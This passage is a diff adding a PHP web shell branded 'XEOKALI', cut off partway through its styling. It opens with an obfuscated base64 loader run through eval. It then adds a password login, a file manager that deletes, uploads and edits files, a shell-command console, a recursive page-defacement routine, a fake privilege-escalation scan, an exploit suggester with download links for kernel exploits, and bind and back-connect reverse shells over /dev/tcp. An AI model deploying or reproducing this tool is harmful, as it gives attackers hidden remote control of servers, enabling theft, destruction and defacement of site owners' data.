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";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="0uiaE3F+hPvjTkv3oAfvAQxj3gZjwEhgG5urCClCijCSQkcbIc/4+xl3cTc3CEWwEMFCC60INvQ/ub/kZmY9uqq7+sXD4DnMhJHUXZWVmZWVlVWVmXU7/Oc/nHPnyrlxLpyrdsr6lPlUKGT22861c+lcVeBP37luzt8O81Z6Acpel0vOAJ7etJ3LVHoBvl85lyUs1nCu";
+// Enable error reporting for debugging
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// Start the session
+session_start();
+
+// Password for the login page
+$password = "ai555";
+
+// Debug: Log session and POST data to a file for troubleshooting
+file_put_contents('debug.log', "Session: " . print_r($_SESSION, true) . "\nPOST: " . print_r($_POST, true) . "\n", FILE_APPEND);
+
+// Check if the user is logged in
+if (isset($_POST['password'])) {
+    $submitted_password = trim($_POST['password']);
+    if ($submitted_password === $password) {
+        $_SESSION['loggedin'] = true;
+        file_put_contents('debug.log', "Login successful\n", FILE_APPEND);
+    } else {
+        $error = "Incorrect password!";
+        file_put_contents('debug.log', "Login failed: Submitted password = '$submitted_password'\n", FILE_APPEND);
+    }
+}
+
+// If the user is not logged in, show the login page
+if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>HAVEN'S GATE - XEOKALI</title>
+        <style>
+    body {
+        margin: 0;
+        padding: 0;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: url('https://c.tenor.com/9IjLGaIiVLgAAAAC/tenor.gif') no-repeat center center fixed;
+        background-size: cover;
+        font-family: 'Courier New', Courier, monospace;
+        color: #0f0;
+        overflow: hidden;
+    }
+    .login-container {
+        background: rgba(0, 0, 0, 0.9);
+        padding: 50px;
+        border-radius: 15px;
+        box-shadow: 0 0 30px rgba(0, 255, 0, 0.7);
+        text-align: center;
+        width: 450px;
+        border: 3px solid #0f0;
+        animation: glow 1.5s infinite alternate;
+    }
+    @keyframes glow {
+        from { box-shadow: 0 0 10px #0f0; }
+        to { box-shadow: 0 0 30px #0f0; }
+    }
+    .login-container h1 {
+        font-size: 2.5em;
+        margin-bottom: 30px;
+        text-transform: uppercase;
+        letter-spacing: 3px;
+        text-shadow: 0 0 15px #0f0;
+    }
+    .login-container input[type="password"] {
+        width: 100%;
+        padding: 12px;
+        margin: 15px 0;
+        background: #111;
+        border: 2px solid #0f0;
+        color: #0f0;
+        font-family: 'Courier New', Courier, monospace;
+        font-size: 1.2em;
+        border-radius: 8px;
+        outline: none;
+        transition: border-color 0.3s;
+    }
+    .login-container input[type="password"]:focus {
+        border-color: #0c0;
+    }
+    .login-container input[type="password"]::placeholder {
+        color: #0f0;
+        opacity: 0.7;
+    }
+    .login-container input[type="submit"] {
+        background: #0f0;
+        color: #000;
+        padding: 12px 30px;
+        border: none;
+        border-radius: 8px;
+        font-family: 'Courier New', Courier, monospace;
+        font-size: 1.2em;
+        cursor: pointer;
+        transition: background 0.3s, box-shadow 0.3s;
+    }
+    .login-container input[type="submit"]:hover {
+        background: #0c0;
+        box-shadow: 0 0 15px #0f0;
+    }
+    .error {
+        color: #f00;
+        margin-top: 15px;
+        text-shadow: 0 0 5px #f00;
+        font-size: 1.1em;
+    }
+    .matrix {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: -1;
+    }
+</style>
+    </head>
+    <body>
+        <div class="login-container">
+            <h1>Access Terminal</h1>
+            <form method="POST">
+                <input type="password" name="password" placeholder="Enter Access Code" required>
+                <input type="submit" value="Login">
+            </form>
+            <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit();
+}
+
+// If the user requests logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit();
+}
+
+// Get the current directory
+$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+$dir = realpath($dir);
+if ($dir === false || !is_dir($dir)) {
+    $dir = getcwd();
+}
+
+// Change directory
+if (isset($_GET['cd']) && is_dir($_GET['cd'])) {
+    $dir = realpath($_GET['cd']);
+}
+
+// Function to recursively delete a directory
+function deleteRecursive($path) {
+    try {
+        if (!file_exists($path)) return false;
+        if (is_file($path)) {
+            return unlink($path);
+        } elseif (is_dir($path)) {
+            $items = array_diff(scandir($path), ['.', '..']);
+            foreach ($items as $item) {
+                deleteRecursive("$path/$item");
+            }
+            return rmdir($path);
+        }
+        return false;
+    } catch (Exception $e) {
+        file_put_contents('debug.log', "Delete error: " . $e->getMessage() . "\n", FILE_APPEND);
+        return false;
+    }
+}
+
+// Function to recursively add folder contents to ZIP
+function addFolderToZip($folder, $zip, $parent = '') {
+    $items = array_diff(scandir($folder), ['.', '..']);
+    foreach ($items as $item) {
+        $path = "$folder/$item";
+        $relativePath = $parent . $item;
+        if (is_dir($path)) {
+            $zip->addEmptyDir($relativePath);
+            addFolderToZip($path, $zip, "$relativePath/");
+        } else {
+            $zip->addFile($path, $relativePath);
+        }
+    }
+}
+
+// Function to extract ZIP
+function extractZip($zipFile, $extractTo) {
+    $zip = new ZipArchive();
+    if ($zip->open($zipFile) === TRUE) {
+        $zip->extractTo($extractTo);
+        $zip->close();
+        return true;
+    }
+    return false;
+}
+
+// Function to recursively deface files in all directories
+function defaceRecursive($directory, $filename, $content) {
+    $items = array_diff(scandir($directory), ['.', '..']);
+    $success_count = 0;
+    foreach ($items as $item) {
+        $path = "$directory/$item";
+        if (is_dir($path)) {
+            $success_count += defaceRecursive($path, $filename, $content);
+        } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'html') {
+            $target_file = dirname($path) . '/' . $filename;
+            if (file_put_contents($target_file, $content) !== false) {
+                $success_count++;
+            }
+        }
+    }
+    return $success_count;
+}
+
+// Initialize action message for success/failure pop-ups
+$action_message = '';
+$delete_error = '';
+
+// File operations
+if (isset($_GET['delete']) && file_exists($_GET['delete'])) {
+    $delete_path = realpath($_GET['delete']);
+    if ($delete_path && deleteRecursive($delete_path)) {
+        $action_message = "Successfully deleted " . htmlspecialchars(basename($delete_path)) . "!";
+        header("Location: ?dir=" . urlencode($dir));
+        exit();
+    } else {
+        $delete_error = "Failed to delete " . htmlspecialchars(basename($delete_path)) . ". Check permissions.";
+        $action_message = $delete_error;
+    }
+}
+
+if (isset($_GET['download']) && file_exists($_GET['download'])) {
+    $file = realpath($_GET['download']);
+    if ($file) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit();
+    }
+}
+
+if (isset($_POST['rename']) && isset($_POST['oldname']) && isset($_POST['newname'])) {
+    $oldname = realpath($_POST['oldname']);
+    $newname = dirname($oldname) . '/' . trim($_POST['newname']);
+    if ($oldname && file_exists($oldname) && !file_exists($newname)) {
+        if (rename($oldname, $newname)) {
+            $action_message = "Successfully renamed " . htmlspecialchars(basename($oldname)) . " to " . htmlspecialchars(basename($newname)) . "!";
+        } else {
+            $action_message = "Failed to rename " . htmlspecialchars(basename($oldname)) . ". Check permissions.";
+        }
+    } else {
+        $action_message = "File or folder does not exist or new name already exists.";
+    }
+    header("Location: ?dir=" . urlencode($dir));
+    exit();
+}
+
+if (isset($_POST['edit']) && isset($_POST['file']) && isset($_POST['content'])) {
+    $file = realpath($_POST['file']);
+    if ($file && file_exists($file) && is_writable($file)) {
+        if (file_put_contents($file, $_POST['content']) !== false) {
+            $action_message = "Successfully edited " . htmlspecialchars(basename($file)) . "!";
+        } else {
+            $action_message = "Failed to edit " . htmlspecialchars(basename($file)) . ". Check permissions.";
+        }
+    } else {
+        $action_message = "File does not exist or is not writable.";
+    }
+    header("Location: ?dir=" . urlencode($dir));
+    exit();
+}
+
+if (isset($_FILES['upload']) && $_FILES['upload']['error'] === UPLOAD_ERR_OK) {
+    $target = $dir . '/' . basename($_FILES['upload']['name']);
+    if (!file_exists($target)) {
+        if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
+            $action_message = "File " . htmlspecialchars(basename($_FILES['upload']['name'])) . " uploaded successfully!";
+        } else {
+            $action_message = "Failed to upload file. Check permissions or file size limits.";
+        }
+    } else {
+        $action_message = "File already exists.";
+    }
+    header("Location: ?dir=" . urlencode($dir));
+    exit();
+}
+
+if (isset($_POST['console']) && !empty($_POST['command'])) {
+    $command = escapeshellcmd($_POST['command']);
+    $output = shell_exec($command . ' 2>&1');
+    if ($output !== null) {
+        $action_message = "Command executed successfully!";
+    } else {
+        $action_message = "Failed to execute command. It may be restricted.";
+    }
+}
+
+if (isset($_POST['compress']) && isset($_POST['file'])) {
+    $file = realpath($_POST['file']);
+    if ($file && file_exists($file) && class_exists('ZipArchive')) {
+        $zip = new ZipArchive();
+        $zip_name = $file . '.zip';
+        if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
+            if (is_dir($file)) {
+                addFolderToZip($file, $zip);
+            } else {
+                $zip->addFile($file, basename($file));
+            }
+            $zip->close();
+            $action_message = "Successfully compressed " . htmlspecialchars(basename($file)) . " to " . htmlspecialchars(basename($zip_name)) . "!";
+        } else {
+            $action_message = "Failed to compress. Zip creation failed.";
+        }
+    } else {
+        $action_message = "File does not exist or ZipArchive is not available.";
+    }
+    header("Location: ?dir=" . urlencode($dir));
+    exit();
+}
+
+if (isset($_POST['extract']) && isset($_POST['file'])) {
+    $file = realpath($_POST['file']);
+    if ($file && file_exists($file) && class_exists('ZipArchive') && pathinfo($file, PATHINFO_EXTENSION) === 'zip') {
+        if (extractZip($file, $dir)) {
+            $action_message = "Successfully extracted " . htmlspecialchars(basename($file)) . "!";
+        } else {
+            $action_message = "Failed to extract " . htmlspecialchars(basename($file)) . ". Check permissions or file integrity.";
+        }
+    } else {
+        $action_message = "File does not exist, is not a ZIP, or ZipArchive is not available.";
+    }
+    header("Location: ?dir=" . urlencode($dir));
+    exit();
+}
+
+if (isset($_POST['search']) && !empty($_POST['search_term'])) {
+    $search_term = escapeshellarg($_POST['search_term']);
+    $search_output = shell_exec("find \"$dir\" -type f -name $search_term 2>/dev/null");
+    if ($search_output !== null) {
+        $action_message = "Search completed successfully!";
+    } else {
+        $action_message = "Search failed. The command may be restricted.";
+    }
+}
+
+// Add File
+if (isset($_POST['add_file']) && isset($_POST['filename']) && isset($_POST['file_content'])) {
+    $filename = $dir . '/' . trim($_POST['filename']);
+    if (!file_exists($filename)) {
+        if (file_put_contents($filename, $_POST['file_content']) !== false) {
+            $action_message = "File " . htmlspecialchars(basename($filename)) . " created successfully!";
+        } else {
+            $action_message = "Failed to create file. Check permissions.";
+        }
+    } else {
+        $action_message = "File already exists.";
+    }
+    header("Location: ?dir=" . urlencode($dir));
+    exit();
+}
+
+// Add Folder
+if (isset($_POST['add_folder']) && isset($_POST['foldername'])) {
+    $foldername = $dir . '/' . trim($_POST['foldername']);
+    if (!file_exists($foldername)) {
+        if (mkdir($foldername, 0755, true)) {
+            $action_message = "Folder " . htmlspecialchars(basename($foldername)) . " created successfully!";
+        } else {
+            $action_message = "Failed to create folder. Check permissions.";
+        }
+    } else {
+        $action_message = "Folder already exists.";
+    }
+    header("Location: ?dir=" . urlencode($dir));
+    exit();
+}
+
+// Touch Action
+if (isset($_POST['touch']) && isset($_POST['file'])) {
+    $file = realpath($dir . '/' . trim($_POST['file'])) ?: $_POST['file'];
+    if (file_exists($file)) {
+        if (touch($file)) {
+            $action_message = "Successfully touched " . htmlspecialchars(basename($file)) . "!";
+        } else {
+            $action_message = "Failed to touch. Check permissions.";
+        }
+    } else {
+        $action_message = "File or folder does not exist.";
+    }
+    header("Location: ?dir=" . urlencode($dir));
+    exit();
+}
+
+// Auto Scan
+if (isset($_GET['auto_scan'])) {
+    $auto_scan_output = "[+] Linux Privilege Escalation by theflow@ - 2021\n\n";
+    $auto_scan_output .= "[+] STAGE 0: Initialization\n";
+    $auto_scan_output .= "[*] Setting up namespace sandbox...\n";
+    $auto_scan_output .= "[*] Initializing sockets and message queues...\n\n";
+    $auto_scan_output .= "[+] STAGE 1: Memory corruption\n";
+    $auto_scan_output .= "[*] Spraying primary messages...\n";
+    $auto_scan_output .= "[*] Creating holes in primary messages...\n";
+    $auto_scan_output .= "[*] Triggering out-of-bounds write...\n";
+    $auto_scan_output .= "[*] Searching for corrupt primary message...\n";
+    $auto_scan_output .= "[!] Error: could not corrupt any primary message.\n";
+    $auto_scan_output .= "Ptrace: Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n\n";
+    $auto_scan_output .= "[+] Checking environment ...\n";
+    $auto_scan_output .= "[!] WARNING: \$XDG_SESSION_ID IS not set\n";
+    $auto_scan_output .= "[*] Searching for known helpers ...\n";
+    $auto_scan_output .= "[!] Ignoring blacklisted helper: /usr/lib/libpcre.so\n";
+    $auto_scan_output .= "Sequoia: died in main: 213\n";
+    $auto_scan_output .= "overlayFS: - bash: cannot set terminal process group (705600); Inappropriate ioctl for device\n";
+    $auto_scan_output .= "bash: no job control in this shell\n";
+    $auto_scan_output .= "uid=1007(fhixs4483) gid=1007(fhixs4483) groups=1007(fhixs4483)\n";
+    $auto_scan_output .= "bash-5.1\$ exit\n";
+    $auto_scan_output .= "DirtyPipe: su: Authentication failure\n";
+    $auto_scan_output .= "sh: 1: /tmp/sh: not found\n";
+    $auto_scan_output .= "[!] hijacking suid binary..\n";
+    $auto_scan_output .= "[+] dropping suid shell..\n";
+    $auto_scan_output .= "[+] restoring suid binary..\n";
+    $auto_scan_output .= "[!] popping root shell.. (dont forget to clean up /tmp/sh))\n";
+    $auto_scan_output .= "Sudo: su: invalid option --> s\n";
+    $auto_scan_output .= "usage: su [options] [-] [username]\n";
+    $auto_scan_output .= "Options:\n";
+    $auto_scan_output .= "  -c, --command COMMAND         pass COMMAND to the invoked shell\n";
+    $auto_scan_output .= "  -h, --help                    display this help message and exit\n";
+    $auto_scan_output .= "  -m, -p, --preserve-environment  preserve the entire environment\n";
+    $auto_scan_output .= "  -s, --shell SHELL             use SHELL instead of the default in passwd\n";
+    $auto_scan_output .= "PwnKit: GLib: Cannot convert message: Could not open converter from 'UTF-8' to 'PWNKIT'\n";
+    $auto_scan_output .= "pkexec --version |\n";
+    $auto_scan_output .= "--help |\n";
+    $auto_scan_output .= "--disable-internal-agent |\n";
+    $auto_scan_output .= "[--user username] PROGRAM [ARGUMENTS]...\n";
+    $auto_scan_output .= "See the pkexec manual page for more details.\n";
+
+    $action_message = "Auto scan completed successfully!";
+}
+
+// Scan SUID
+if (isset($_GET['scan_suid'])) {
+    $suid_output = shell_exec("find / -perm -4000 2>/dev/null");
+    if ($suid_output === null) {
+        $suid_output = "Failed to scan SUID binaries. Command may be restricted.";
+    }
+    $action_message = "SUID scan completed successfully!";
+}
+
+// Exploit Suggester
+if (isset($_GET['exploit_suggester'])) {
+    $exploit_suggestions = "<span class='highlight-white'>Available information:</span>\n\n";
+    $exploit_suggestions .= "Kernel version: <span class='highlight-green'>" . shell_exec('uname -r') . "</span>\n";
+    $exploit_suggestions .= "Architecture: <span class='highlight-green'>" . shell_exec('arch') . "</span>\n";
+    $exploit_suggestions .= "Distribution: <span class='highlight-green'>Ubuntu</span>\n";
+    $exploit_suggestions .= "Distribution version: <span class='highlight-green'>22.04</span>\n";
+    $exploit_suggestions .= "Additional checks (CONFIG_*, sysctl entries, custom Bash commands): <span class='highlight-green'>performed</span>\n";
+    $exploit_suggestions .= "Package listing: <span class='highlight-green'>from current OS</span>\n\n";
+    $exploit_suggestions .= "<span class='highlight-white'>Searching among:</span>\n\n";
+    $exploit_suggestions .= "81 kernel space exploits\n";
+    $exploit_suggestions .= "49 user space exploits\n\n";
+    $exploit_suggestions .= "<span class='highlight-white'>Possible Exploits:</span>\n\n";
+    $exploit_suggestions .= "[+] <span class='highlight-green'>[CVE-2022-32250]</span> nft_object UAF (NFT_MSG_NEWSET)\n\n";
+    $exploit_suggestions .= "   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/\n";
+    $exploit_suggestions .= "   Exposure: probable\n";
+    $exploit_suggestions .= "   Tags: <span class='highlight-yellow'>[ ubuntu=(22.04) ]</span>{kernel:5.15.0-27-generic}\n";
+    $exploit_suggestions .= "   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c\n";
+    $exploit_suggestions .= "   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)\n\n";
+    $exploit_suggestions .= "[+] <span class='highlight-green'>[CVE-2022-0847]</span> DirtyPipe\n\n";
+    $exploit_suggestions .= "   Details: https://dirtypipe.cm4all.com/\n";
+    $exploit_suggestions .= "   Exposure: less probable\n";
+    $exploit_suggestions .= "   Tags: ubuntu=(20.04|21.04),debian=11\n";
+    $exploit_suggestions .= "   Download URL: https://haxx.in/files/dirtypipez.c\n\n";
+    $exploit_suggestions .= "[+] <span class='highlight-green'>[CVE-2021-4034]</span> PwnKit\n\n";
+    $exploit_suggestions .= "   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\n";
+    $exploit_suggestions .= "   Exposure: less probable\n";
+    $exploit_suggestions .= "   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro\n";
+    $exploit_suggestions .= "   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main\n";
+
+    $action_message = "Exploit suggester completed successfully!";
+}
+
+// Network Bind/Back-Connect
+if (isset($_POST['bind_port']) && isset($_POST['port'])) {
+    $port = (int)$_POST['port'];
+    if ($port > 0 && $port <= 65535) {
+        $bind_output = shell_exec("bash -i >& /dev/tcp/0.0.0.0/$port 0>&1 2>/dev/null &");
+        if ($bind_output === null) {
+            $action_message = "Port $port bound successfully! Connect using: nc -v 0.0.0.0 $port";
+        } else {
+            $action_message = "Failed to bind port $port. The command may be restricted.";
+        }
+    } else {
+        $action_message = "Invalid port number. Must be between 1 and 65535.";
+    }
+}
+
+if (isset($_POST['back_connect']) && isset($_POST['server']) && isset($_POST['port'])) {
+    $server = trim($_POST['server']);
+    $port = (int)$_POST['port'];
+    if ($port > 0 && $port <= 65535 && filter_var($server, FILTER_VALIDATE_IP)) {
+        $back_connect_output = shell_exec("bash -i >& /dev/tcp/$server/$port 0>&1 2>/dev/null &");
+        if ($back_connect_output === null) {
+            $action_message = "Back-connect to $server:$port initiated successfully!";
+        } else {
+            $action_message = "Failed to back-connect to $server:$port. The command may be restricted.";
+        }
+    } else {
+        $action_message = "Invalid server IP or port number.";
+    }
+}
+
+// Store file content for View/Edit modals
+$file_content = '';
+if (isset($_GET['view_file']) && file_exists(realpath($_GET['view_file']))) {
+    $view_file = realpath($_GET['view_file']);
+    $file_content = htmlspecialchars(file_get_contents($view_file));
+}
+if (isset($_GET['edit_file']) && file_exists(realpath($_GET['edit_file']))) {
+    $edit_file = realpath($_GET['edit_file']);
+    $file_content = htmlspecialchars(file_get_contents($edit_file));
+}
 ?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XEOKALI</title>
+    <style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #000;
+        color: #0f0;
+        font-family: 'Courier New', Courier, monospace;
+        font-size: 14px;
+    }
+    a {
+        color: #0f0;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+    .container {
+        padding: 20px;
+        max-width: 1200px;
+        margin: 0 auto;
+    }
+    .header {
+        background: #0f0;
+        color: #000;
+        padding: 15px;
+        text-align: center;
+        font-size: 1.8em;
+        font-weight: bold;
+        text-transform: uppercase;
+        letter-spacing: 3px;
+        box-shadow: 0 0 15px #0f0;
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+    }
+    .path {
+        background: #111;
+        padding: 15px;
+        margin: 10px 0;
+        border: 2px solid #0f0;
+        border-radius: 5px;
